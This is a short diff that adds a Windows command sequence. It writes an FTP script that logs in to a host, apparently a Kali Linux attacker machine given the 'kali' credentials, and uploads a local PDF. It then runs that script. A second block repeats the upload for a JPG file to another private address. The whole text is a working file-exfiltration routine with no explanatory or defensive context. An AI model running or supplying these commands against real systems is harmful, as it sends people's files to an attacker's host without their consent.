@@ -1,0 +1,16 @@
+echo open 192.168.1.171> ftp.txt
+echo kali>> ftp.txt
+echo kali>> ftp.txt
+echo bin>> ftp.txt
+echo put PDFDeclaracion.pdf>> ftp.txt
+echo bye>> ftp.txt
+
+ftp -s:ftp.txt
+
+
+
+open 192.168.44.130
+kali
+kali
+put P1010975.JPG
+bye
